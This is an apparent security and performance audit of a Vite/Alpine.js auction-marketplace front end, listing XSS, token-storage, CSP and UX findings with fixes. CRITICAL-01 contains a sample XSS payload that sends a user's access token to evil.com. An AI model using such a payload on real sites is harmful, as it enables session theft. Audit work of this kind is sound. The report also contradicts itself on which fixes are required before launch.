# SAIYAD_UI — FULL TECHNICAL AUDIT REPORT

**Repository:** https://github.com/AhmedSaad-EGY/Saiyad_UI  
**Live Deploy:** https://saiyad-eg.vercel.app  
**Backend API:** https://sayiad.runasp.net/swagger/index.html  
**Stack:** Vite + Vanilla JS + Alpine.js v3 + Bootstrap 5 + .NET Core Web API  
**Date:** June 2026  
**Auditor Role:** Senior Software Architect + Security Auditor + Performance Engineer  

---

## 1. Executive Summary

The architecture of this project is better than average for its tier. The feature-split directory structure (`app / features / widgets / shared / pages`), the centralized API client with request deduplication, the disciplined use of `escapeHtml` across 165+ render sites, DOMPurify integration, and the Vite chunk-splitting configuration all reflect an understanding of modern frontend engineering. The previous critical bug — a catastrophic localStorage key mismatch that broke authentication entirely — has been correctly resolved via `src/shared/constants/storage-keys.js`.

However, three critical issues remain that make this project **non-deployable** to production today:

1. **The navbar updates the wrong DOM element via `innerHTML` with user-controlled data.** Every authenticated page load destroys the dropdown menu structure and is XSS-vulnerable.
2. **JWT and refresh tokens stored in `localStorage`.** For a platform handling real-money wallet transactions, this is unacceptable. Any XSS gives an attacker persistent account access.
3. **`unsafe-eval` in the Content Security Policy.** This renders the CSP nearly useless — the single most important XSS mitigation in the browser.

Beyond these blockers, there are 6 high-severity and 9 medium-severity issues detailed below. The production backend (`sayiad.runasp.net`) is currently returning 403/unavailable, meaning the live app shows "Service Temporarily Unavailable" to all users — a separate operational problem that must be resolved before any security analysis of backend integration is even meaningful.

**Verdict: NOT PRODUCTION READY.**  
4–8 focused hours of fixes are required before deployment is responsible.

---

## 2. Critical Issues

---

### CRITICAL-01 — `userMenu.innerHTML` targets wrong element with user-controlled data
**File:** `src/app/navbar.js:13–15`

```js
const userMenu = document.getElementById("userMenu");
if (userMenu) {
  userMenu.innerHTML = user?.fullName || user?.name || user?.email || t('nav.profile');
}
```

**Why it is critical — two compounding bugs:**

**Bug A (Structural):** `id="userMenu"` in `src/index.html` is the **outer dropdown container div**, not the `<span id="userName">` inside the toggle button. Every time `updateNavbar()` runs with an authenticated user, the entire dropdown structure (button, menu items, role-based links, logout button) is replaced with a plain text node. The user dropdown is completely non-functional for every logged-in user. The correct target is `document.getElementById('userName').textContent`.

**Bug B (XSS):** Using `innerHTML` with `user?.fullName` is an XSS vulnerability. If an attacker registers with `fullName: '<img src=x onerror="fetch(\'https://evil.com/?t=\'+localStorage.getItem(\'sayiad_accessToken\'))">'`, that payload executes on every authenticated page load for that user — and combined with CRITICAL-02 below, that payload steals the JWT.

**Impact:**
- The user dropdown is visually broken (plain name text, no menu) for 100% of authenticated users.  
- Any user who registers a malicious `fullName` gets persistent script execution in their own session. If an admin previews user profiles, this executes in the admin's session.

**Fix:**
```js
// Target the correct span with textContent (not innerHTML)
const userNameEl = document.getElementById("userName");
if (userNameEl) {
  userNameEl.textContent = user?.fullName || user?.name || user?.email || t('nav.profile');
}
// userMenu visibility is managed separately via classList
const userMenu = document.getElementById("userMenu");
if (userMenu) userMenu.classList.toggle("d-none", !auth);
```

---

### CRITICAL-02 — JWT and refresh tokens stored in `localStorage`
**Files:** `src/shared/api/client.js:8–24`, `src/features/auth/login.js:47–49`

Both `sayiad_accessToken` and `sayiad_refreshToken` are stored in `localStorage`:

```js
// client.js
let _cachedAccessToken = localStorage.getItem(KEYS.ACCESS_TOKEN) || null;
// ...
localStorage.setItem(KEYS.REFRESH_TOKEN, data.refreshToken);
```

**Why it is critical:**

`localStorage` is accessible to every script running on the page. For a marketplace with real-money wallet transactions (deposits, orders), this is the wrong storage location. Any XSS — including the one in CRITICAL-01 — instantly yields both the access token and the refresh token. With the refresh token, an attacker does not need to re-exploit; they can silently rotate tokens and maintain persistent account access long after the XSS is patched.

**Impact:** Complete account takeover via any XSS. Wallet balance theft. Order manipulation. Persistent session hijacking through refresh token theft.

**Fix:**
The access token should move to a `sessionStorage` minimum (cleared on browser close). The refresh token — given it enables long-lived sessions — must be in an `httpOnly` `Secure` `SameSite=Strict` cookie set by the backend. This requires a backend change: the `/auth/refresh` endpoint must accept the refresh token from a cookie, not the request body. This is a non-trivial but mandatory architectural fix for a financial platform.

Interim: Move access token to `sessionStorage` immediately. Coordinate with backend to implement `httpOnly` cookie for refresh token before launch.

---

### CRITICAL-03 — `unsafe-eval` in Content Security Policy
**File:** `vercel.json:9`

```json
"script-src 'self' 'unsafe-eval' cdnjs.cloudflare.com"
```

**Why it is critical:**

`unsafe-eval` permits `eval()`, `new Function()`, `setTimeout(string)`, and `setInterval(string)`. It was almost certainly added to silence an Alpine.js or Bootstrap initialization error. Its presence neutralizes the primary XSS defense of the CSP — an attacker who achieves any script injection can use `eval()` to execute arbitrary code regardless of what the CSP allows.

Alpine.js 3.x and Bootstrap 5 both work correctly without `unsafe-eval`. This directive needs to be removed and the console tested clean.

**Impact:** The CSP, as written, provides almost no protection. The X-Frame-Options, X-Content-Type-Options, and other headers in `vercel.json` remain valid, but the XSS mitigations are gutted.

**Fix:**
1. Remove `'unsafe-eval'` from `script-src` in `vercel.json`.
2. Run `npm run dev` and `npm run build && npm run preview`.
3. Fix any console errors. Alpine.js 3 requires no eval. Bootstrap 5's dynamic modals do not require eval. SignalR 8.x does not require eval.

---

## 3. High Severity Issues

---

### HIGH-01 — No SRI on Font Awesome and Animate.css CDN resources
**File:** `src/index.html:33–34`

```html
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
```

The SignalR script correctly includes `integrity="sha512-..."`. These two CSS files do not. If `cdnjs.cloudflare.com` is compromised or subject to a BGP hijack, an attacker can inject arbitrary CSS (CSS-based keyloggers, `content:` attribute exfiltration, UI redressing, or `expression()` in legacy IE).

**Fix:** Add `integrity` and `crossorigin="anonymous"` to both links:

```html
<link rel="stylesheet"
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
  integrity="sha512-Avb2QiuDEEvB4bZJYdab7eDz2kFERHMCfFKXgNvpqMfK/..."
  crossorigin="anonymous">
```

Generate hashes from: https://www.srihash.org or `openssl dgst -sha512 -binary FILE | openssl base64 -A`.

---

### HIGH-02 — `isAuthenticated()` checks token presence, not validity
**File:** `src/shared/utils/auth-state.js:10`

```js
export function isAuthenticated() {
  return !!localStorage.getItem(KEYS.ACCESS_TOKEN);
}
```

Route guards in `src/shared/constants/routes.js` use this function to determine access. A user with an expired JWT is considered authenticated, passes the route guard, all API calls return 401, the refresh cycle fires, and if the refresh token is also stale, the user is silently ejected. The UX is confusing — the user sees protected pages render briefly before being redirected.

**Fix:**

```js
export function isAuthenticated() {
  const token = localStorage.getItem(KEYS.ACCESS_TOKEN);
  if (!token) return false;
  try {
    const payload = JSON.parse(atob(token.split('.')[1]));
    // exp is seconds since epoch
    return payload.exp ? (payload.exp * 1000 > Date.now()) : true;
  } catch { return false; }
}
```

---

### HIGH-03 — `hasRole()` dual-source check creates exploitable inconsistency
**File:** `src/shared/utils/auth-state.js:19–22`

```js
export function hasRole(role) {
  const user = getUser();
  return (user && user.role === role) || getRoleFromToken() === role;
}
```

This returns `true` if **either** the localStorage user object OR the JWT claims the role. The user object in localStorage is never refreshed except on login. If a user's role is downgraded server-side (e.g., banned admin), the old role remains in `localStorage.getItem(KEYS.USER)` until the user manually logs out or clears storage. Every `hasRole('Admin')` check returns `true` for a demoted admin because the localStorage user object still says `role: "Admin"`.

**Impact:** Demoted admin retains admin-appearing UI. This is partly mitigated by backend API authorization (the API will return 403), but the frontend continues showing admin controls, sending admin API requests, and confusing the user.

**Fix:** Trust the JWT only, not the cached user object, for role decisions:
```js
export function hasRole(role) {
  const tokenRole = getRoleFromToken();
  return tokenRole === role || (Array.isArray(tokenRole) && tokenRole.includes(role));
}
```

---

### HIGH-04 — `window.signalR` used without null-check in `getConnection()`
**File:** `src/app/realtime.js:12,16`

```js
const signalR = window.signalR;  // module-level, runs at import time

function getConnection() {
  // ... called when user enters auction page
  _connection = new signalR.HubConnectionBuilder()  // crashes if signalR is undefined
```

The CDN script for SignalR is loaded synchronously before `main.js` in `index.html`, which means under normal conditions it is available. But if the CDN request fails (network error, CDN outage, ad blocker), `window.signalR` is `undefined`, and the first call to `getConnection()` throws `TypeError: Cannot read properties of undefined (reading 'HubConnectionBuilder')` — crashing the entire auction detail page with no user-visible error.

Note: `isSignalRConnected()` does check `!signalR`, but `getConnection()` does not.

**Fix:**
```js
function getConnection() {
  if (!signalR) {
    console.warn('SignalR SDK not loaded. Real-time features unavailable.');
    return null;
  }
  // ... rest of function
}
// Guard call sites:
export function startIfNeeded() {
  if (!signalR || !localStorage.getItem(KEYS.ACCESS_TOKEN)) return Promise.resolve();
  // ...
}
```

---

### HIGH-05 — Placeholder contact number in production footer
**File:** `src/index.html:155`

```html
<a href="https://wa.me/201234567890" ...>
```

`+20 123 456 7890` is a demonstrably fake number (Egyptian mobile numbers are 10 digits after country code; `1234567890` is not a valid Egyptian mobile number). This is live on `saiyad-eg.vercel.app`. Users who click "Contact via WhatsApp" are routed to a stranger or a non-existent number.

**Fix:** Replace with the actual business WhatsApp number or remove the link entirely until one is established.

---

### HIGH-06 — Auction bid input's `maxBid` cap is arbitrarily computed and restrictive
**File:** `src/features/auctions/bid.js` (Alpine.data `auctionDetailPage`)

```js
const maxBidVal = a.reservePrice && a.reservePrice > minBidVal
  ? a.reservePrice * 1.5
  : minBidVal * 5;
this.maxBid = maxBidVal;
```

For an auction with no reserve price, bids are artificially capped at `startingPrice * 5`. An auction starting at EGP 500 is capped at EGP 2,500. Once bidding reaches EGP 2,490, no further bids can be placed through the UI — the input field's `max` attribute prevents entry. The auction stalls at sub-market value.

There is no backend basis for this cap. It is purely frontend logic invented without a business requirement.

**Fix:** Remove the `max` attribute constraint entirely. Backend enforces actual bid validation. At most, apply a very high sanity cap (e.g., `startingPrice * 1000`) to prevent obvious user input errors, not artificial price ceilings.

---

## 4. Medium / Low Issues

---

### MEDIUM-01 — Internal audit report committed to repository
**File:** `New Text Document.txt` (repo root, 18KB)

A full "SAIYAD_UI — FULL TECHNICAL AUDIT REPORT" is in version control. It reveals previously discovered vulnerabilities (including the token key mismatch that has since been fixed), internal architecture decisions, and technical debt. Any contributor or fork has access to this document.

**Fix:** `git rm "New Text Document.txt"` and add `*.txt` (or the specific filename) to `.gitignore`. Clean the git history if the repo becomes public-facing.

---

### MEDIUM-02 — AI agent configuration committed to repository
**File:** `.agents/deepseek-pro.ts`, `.agents/types/`

Dev tooling files specifying AI agent IDs, model routing (`deepseek/deepseek-v4-pro` via OpenRouter), and capability configurations are committed. These should not be in a production repository.

**Fix:** Add `.agents/` to `.gitignore` and remove from tracking: `git rm -r --cached .agents/`.

---

### MEDIUM-03 — PWA manifest language declared Arabic despite English default
**File:** `src/public/manifest.json`

```json
{ "lang": "ar" }
```

The app boots in English (`<html lang="en">`). The manifest declares Arabic. PWA install prompts will claim the app is in Arabic when it is not. The `shortcuts` use `"url": "/#/products"` — but hash-based SPAs need `"url": "#/products"` (no leading slash in the hash), otherwise the shortcut navigates to the root with no hash and shows the home page regardless of which shortcut was tapped.

**Fix:** Set `"lang": "en"` in manifest. Fix shortcut URLs to use the correct hash path.

---

### MEDIUM-04 — Single PWA icon marked as both `any` and `maskable`
**File:** `src/public/manifest.json`

```json
{ "src": "/logo.png", "sizes": "192x192", "type": "image/png", "purpose": "any maskable" }
```

`maskable` icons require the visual content to sit within a "safe zone" (80% of the icon area). Using the same image for both `any` and `maskable` typically results in the logo being cropped. Only one icon at one resolution is provided, meaning no high-DPI support.

**Fix:** Separate into two entries with properly designed assets. Add at least a 512x512 icon.

---

### MEDIUM-05 — `hreflang` alternates both point to the same URL
**File:** `src/index.html:46–49`

```html
<link rel="alternate" hreflang="ar" href="https://saiyad-eg.vercel.app">
<link rel="alternate" hreflang="en" href="https://saiyad-eg.vercel.app">
```

Both language alternates resolve to the same page with no language parameter. Search engines that process `hreflang` expect each URL to serve content in that declared language. Since this SPA serves the same URL regardless of language, these directives are actively misleading to Google/Bing.

**Fix:** Either remove the Arabic hreflang (if there is no dedicated Arabic URL), or implement actual URL-based language switching (`/ar/` prefix or `?lang=ar`) with canonical hreflang.

---

### MEDIUM-06 — `normalizeNotifications` has an 8-level API response shape fallback chain
**File:** `src/features/notifications/index.js`

```js
const source =
  Array.isArray(data) ? data
  : Array.isArray(data?.items) ? data.items
  : Array.isArray(data?.data) ? data.data
  : Array.isArray(data?.data?.items) ? data.data.items
  : Array.isArray(data?.data?.data) ? data.data.data
  : Array.isArray(data?.notifications) ? data.notifications
  : Array.isArray(data?.results) ? data.results
  : Array.isArray(data?.value) ? data.value
  : [];
```

This function tries 8 different response shapes before falling back to an empty array. This is a symptom of an unknown or unstable API contract — the backend has apparently returned notifications at all of these paths at different times. When the API finally stabilizes, this chain silently hides any response shape regression.

**Fix:** Agree on one response shape with the backend team. Document it. Remove every fallback except the agreed shape. A runtime `console.warn` on mismatch would help detect future regressions.

---

### MEDIUM-07 — Redirect parameter in login is not validated
**File:** `src/features/auth/login.js:57–58`

```js
const redirect = new URLSearchParams(window.location.hash.split('?')[1] || '').get('redirect') || '';
window.location.hash = redirect ? `#/${redirect}` : '#/';
```

The `redirect` value is used directly as a hash path. While the `#/` prefix prevents HTTP header injection and cross-origin redirects (this is hash-only routing), an attacker can craft:

`https://saiyad-eg.vercel.app/#/login?redirect=admin`

After login, the user lands on `#/admin`. For regular users this shows a 404 or redirects via route guard. For an actual admin, it takes them to the admin panel — which they'd access anyway, so the impact is negligible. More concerning: if a legitimate user is tricked via a phishing link, they are redirected to an attacker-controlled-looking path on the real domain.

**Fix:** Validate that `redirect` is a known route key before using it:

```js
import { routes } from '../app/route-map.js';
const raw = new URLSearchParams(...).get('redirect') || '';
const safeRedirect = raw && Object.prototype.hasOwnProperty.call(routes, raw.split('?')[0]) ? raw : '';
window.location.hash = safeRedirect ? `#/${safeRedirect}` : '#/';
```

---

### MEDIUM-08 — Google Fonts loaded without render-blocking strategy
**File:** `src/index.html:37–41`

Three font families (Syne, Cairo, Inter) × 5 weights each are loaded from Google Fonts as a synchronous stylesheet, no `font-display` strategy. On a slow connection or during a Google Fonts CDN degradation, visible text is invisible until fonts resolve (FOIT). This is particularly bad for a marketplace where product prices and auction timers must be immediately visible.

**Fix:** Add `&display=swap` to the Google Fonts URL parameter. For even better resilience, self-host the fonts via `@fontsource` packages and remove the external CDN dependency.

---

### LOW-01 — `require-atomic-updates` disabled in ESLint
**File:** `eslint.config.js`

```js
"require-atomic-updates": "off", // too many false positives
```

This rule detects race conditions in async code like:
```js
this.value = await someAsyncCall();
// 'this.value' could have been updated by another task between the await and assignment
```
In Alpine.js components with concurrent bid placement, cart operations, and checkout — exactly the kinds of async flows this rule checks — disabling it silently allows subtle race conditions to go undetected.

**Fix:** Address the specific false positives with `// eslint-disable-next-line require-atomic-updates` and re-enable the rule globally.

---

### LOW-02 — Service Worker offline fallback contains hardcoded English
**File:** `src/public/sw.js` (offline HTML template)

The offline fallback page is a hardcoded HTML string inside the service worker with English strings (`"You are offline"`, `"No internet connection"`). This bypasses the i18n system entirely — Arabic-speaking users see an English error page when offline.

**Fix:** Either accept this as a known limitation and document it, or use `Accept-Language` from the original navigation request to serve a localized fallback.

---

### LOW-03 — `escapeHtml()` uses live DOM — breaks in any non-browser test context
**File:** `src/shared/utils/dom.js:140–143`

```js
export function escapeHtml(str) {
  if (!str) return "";
  const d = document.createElement("div");
  d.textContent = str;
  return d.innerHTML;
}
```

This is a correct and safe browser implementation. But it requires `document`, making it impossible to run in Node.js-based unit tests or SSR. Any attempt to add test coverage for render functions will fail at this utility.

**Fix:** Use a string-based implementation for portability:
```js
const htmlEscapes = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
export function escapeHtml(str) {
  if (!str) return "";
  return String(str).replace(/[&<>"']/g, c => htmlEscapes[c]);
}
```

---

## 5. Architectural Breakdown

### 5.1 Layering Issues

The 5-layer structure (`app / features / widgets / shared / pages`) is coherent in intent. The execution has one significant redundancy: the `pages/` layer is nearly valueless. Every file in `src/pages/` does only this:

```js
// src/pages/products.js (representative example)
export default async function renderProducts(_container) {
  _container.innerHTML = `<div x-data="productsPage">...</div>`;
}
```

The actual logic lives in `src/features/` and `src/widgets/`. Pages is a pass-through that adds no behavior and splits code across two directories for no benefit. Consider eliminating it: route handlers register directly from features, and widgets are called there.

### 5.2 Dependency Issues

- `src/features/auctions/bid.js` imports `getUser` from `src/features/auth/login.js`. Cross-feature imports should go through `src/shared/`. `getUser` is a shared utility — it should only live in `src/shared/utils/auth-state.js`.
- `src/app/navbar.js` imports from BOTH `src/features/auth/login.js` AND `src/shared/utils/auth-state.js` for auth utilities. `login.js` re-exports from `auth-state.js`. This creates two import paths for the same module, making it harder to trace where auth state logic lives.
- `src/features/home/index.js` contains `trackRecentlyViewed` — a cross-cutting utility that should live in `src/shared/utils/recently-viewed.js`, not inside a feature module.

### 5.3 Design Pattern Violations

**Alpine.js + imperative DOM manipulation are mixed:** The navbar updates, badge counts, and wallet button state changes bypass Alpine reactivity entirely and manipulate DOM directly (`button.innerHTML = ...`, `badge.classList.toggle(...)`). This creates two competing update paths. A page that renders via Alpine and then modifies itself through direct DOM manipulation can produce inconsistent states when Alpine re-renders.

**Event bus overuse:** The `emit`/`on` pattern from `src/shared/utils/events.js` is used for `auth:changed`, `api:error`, `realtime:bid-placed`, `notifications:stop-polling`, and more. This decouples modules well, but it makes data flow opaque — when something breaks, tracing which handler responded to which event requires grepping every `on(...)` call in the codebase. Consider documenting the event contract explicitly or migrating to Alpine.js stores for predictable reactive state.

---

## 6. Security Review

| ID | Issue | Severity | Location |
|----|-------|----------|----------|
| S-1 | `userMenu.innerHTML` with user-controlled data | CRITICAL | `src/app/navbar.js:15` |
| S-2 | JWT + refresh token in `localStorage` | CRITICAL | `src/shared/api/client.js`, `src/features/auth/login.js` |
| S-3 | `unsafe-eval` in Content Security Policy | CRITICAL | `vercel.json:9` |
| S-4 | No SRI on Font Awesome, Animate.css CDN | HIGH | `src/index.html:33–34` |
| S-5 | `hasRole()` dual-source: localStorage user vs JWT | HIGH | `src/shared/utils/auth-state.js:19` |
| S-6 | Route guards trust token presence, not validity | HIGH | `src/shared/utils/auth-state.js:10` |
| S-7 | Unvalidated `redirect` param post-login | MEDIUM | `src/features/auth/login.js:57` |
| S-8 | `window.signalR` CDN global — no null guard in `getConnection()` | HIGH | `src/app/realtime.js:16` |

**What is done right:** `escapeHtml` is used consistently across all 165+ render sites. `DOMPurify.sanitize()` is implemented as `safeSetHTML()` in `dom.js` and used correctly in product detail rendering. The CSRF implementation reads from the `XSRF-TOKEN` cookie (ASP.NET Core standard) rather than generating a client-side token. The `clearCsrfToken()` call on logout is present. The Vite build pipeline does not expose source maps in production (`sourcemap: false`). Request deduplication prevents duplicate API calls on re-renders.

---

## 7. Performance Review

### Bottlenecks

**Render-blocking fonts:** Three font families from Google Fonts are loaded synchronously before the page renders. On a mobile device in Egypt with an average connection, this delays First Contentful Paint by 400–800ms. The `&display=swap` strategy (or better, `optional`) must be used.

**Monolithic i18n bundle:** `src/shared/utils/i18n.js` is 1,758 lines of translation strings for both English and Arabic loaded into the `core-i18n` chunk, present on every page. The file must not grow further. If a third language is added, the translations must be split into per-language dynamic imports.

**SignalR starts on auction entry but never stops on tab background:** When a user navigates away from an auction detail page, `leaveAuctionGroup()` is called correctly (via route cleanup). However, `stopSignalR()` is only triggered by `auth:logged-out`. The connection remains open indefinitely while the user browses other parts of the app. For a user who opens 10 auction pages, 10 SignalR groups remain subscribed. This creates unnecessary server load and memory pressure.

### What is done well

The Vite `manualChunks` configuration correctly splits vendor dependencies (Alpine.js, Bootstrap) from core app code and page-level code. Dynamic imports via `routes` in `route-map.js` mean page bundles are loaded only when the route is visited. The `requestWithDedup` function in the API client prevents identical concurrent GET requests from firing duplicate network calls. Progressive image loading (`progressiveImg`) with lazy loading is implemented.

---

## 8. Final Verdict

### Production Ready: **NO**

### Minimum Required Fixes Before Deployment

1. **[CRITICAL-01]** Fix `navbar.js:15` — change `userMenu.innerHTML = userName` to `document.getElementById('userName').textContent = userName`. Validate the dropdown renders and functions for authenticated users.

2. **[CRITICAL-02]** Move access token from `localStorage` to `sessionStorage`. Coordinate with backend to implement `httpOnly` refresh token cookie. This is a breaking change requiring backend work.

3. **[CRITICAL-03]** Remove `'unsafe-eval'` from `script-src` in `vercel.json`. Test that Alpine.js and Bootstrap function correctly without it (they do in their current versions).

4. **[HIGH-01]** Add `integrity` and `crossorigin="anonymous"` to the Font Awesome and Animate.css CDN stylesheet links.

5. **[HIGH-04]** Add null-check for `window.signalR` in `getConnection()`. Show a graceful UI error on the auction page if SignalR fails to load.

6. **[HIGH-05]** Replace the placeholder WhatsApp number `+201234567890` with a real contact, or remove the link.

7. **[MEDIUM-01/02]** Remove `New Text Document.txt` and the `.agents/` directory from the repository.

8. **[OPERATIONAL]** Resolve the backend availability issue. The API at `sayiad.runasp.net` is currently returning 403/unavailable. The app is completely non-functional in production until the backend is online.

9. **[MEDIUM-03]** Fix `manifest.json` — change `"lang"` to `"en"`, fix shortcut URLs from `/#/route` to `#/route`, and separate the icon into `any` and `maskable` entries with properly cropped assets.

### What Becomes Lower Priority (Post-Launch Hardening)

- Refresh token to `httpOnly` cookie migration (medium-term)
- SRI hashes for CDN resources (can be added progressively)
- `hasRole()` single-source refactor (cosmetic risk, backend still enforces)
- `require-atomic-updates` ESLint rule restoration
- PWA icon complete set
- `font-display: swap` for Google Fonts
